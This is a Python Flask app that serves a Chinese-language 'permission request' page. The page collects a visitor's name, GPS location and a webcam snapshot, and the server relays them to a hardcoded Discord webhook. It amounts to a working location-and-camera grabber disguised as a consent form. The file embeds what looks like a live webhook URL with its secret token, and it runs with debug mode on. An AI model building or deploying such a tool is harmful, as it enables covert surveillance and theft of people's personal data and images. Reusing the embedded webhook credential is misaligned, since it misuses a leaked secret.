import os
import base64
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>权限许可请求</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 450px; width: 100%; }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; line-height: 1.5; }
        #video-container { margin: 15px 0; display: none; }
        video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
        .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .btn-approve { background-color: #28a745; color: white; }
        .btn-deny { background-color: #dc3545; color: white; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>权限许可请求</h2>
        <p>您是否同意授予权限并分享您的姓名、地理位置以及相机访问权限？</p>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>
        
        <form id="consentForm">
            <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 8px; margin-bottom: 15px;"><br>
            
            <div class="btn-container">
                <button type="button" class="btn-approve" onclick="captureAndSend(true)">Autoriser</button>
                <button type="button" class="btn-deny" onclick="captureAndSend(false)">Refuser</button>
            </div>
        </form>

        <div id="status"></div>
    </div>

    <!-- Canvas hidden for photo capture -->
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function captureAndSend(consent) {
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value;

            if (!consent) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '请求已被拒绝。';
                return;
            }

            if (!username) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '请先填写姓名。';
                return;
            }

            statusDiv.style.color = 'gray';
            statusDiv.innerText = '正在请求权限并拍照...';

            let locationData = "未授权位置";
            let imageBase64 = null;

            // 1. GPS Location
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                });
                locationData = `纬度: ${position.coords.latitude}, 经度: ${position.coords.longitude}`;
            } catch (err) {
                locationData = "拒绝位置权限";
            }

            // 2. Camera Access and Capture
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoElement = document.getElementById('webcam');
                const canvas = document.getElementById('canvas');
                
                videoElement.srcObject = stream;
                document.getElementById('video-container').style.display = 'block';

                await new Promise(resolve => setTimeout(resolve, 1000));

                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                imageBase64 = canvas.toDataURL('image/jpeg');

                stream.getTracks().forEach(track => track.stop());

            } catch (err) {
                console.log("无法访问相机: ", err);
            }

            // 3. Send to server
            try {
                const response = await fetch('/submit-consent', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        consent: true,
                        username: username,
                        location: locationData,
                        image: imageBase64
                    })
                });

                const result = await response.json();
                if (response.ok) {
                    statusDiv.style.color = 'green';
                    statusDiv.innerText = '照片已拍摄并成功发送！';
                } else {
                    statusDiv.style.color = 'red';
                    statusDiv.innerText = result.error || '发生错误。';
                }
            } catch (err) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '无法连接到服务器。';
            }
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    data = request.json or {}
    if not data.get("consent"):
        return jsonify({"message": "请求已被拒绝。"}), 200

    username = data.get("username")
    location = data.get("location")
    image_data = data.get("image")

    payload = {
        "content": (
            f"✅ **收到新的授权与抓拍照片：**\n"
            f"• **姓名：** {username}\n"
            f"• **地理位置 (GPS)：** {location}"
        )
    }

    try:
        if image_data:
            header, encoded = image_data.split(",", 1)
            image_bytes = base64.b64decode(encoded)
            
            files = {
                "file": ("snapshot.jpg", image_bytes, "image/jpeg")
            }
            resp = requests.post(DISCORD_WEBHOOK_URL, data={"payload_json": str(payload).replace("'", '"')}, files=files, timeout=10)
        else:
            resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)

        resp.raise_for_status()
        return jsonify({"message": "发送成功。"}), 200
    except requests.RequestException as e:
        return jsonify({"error": f"发送失败: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)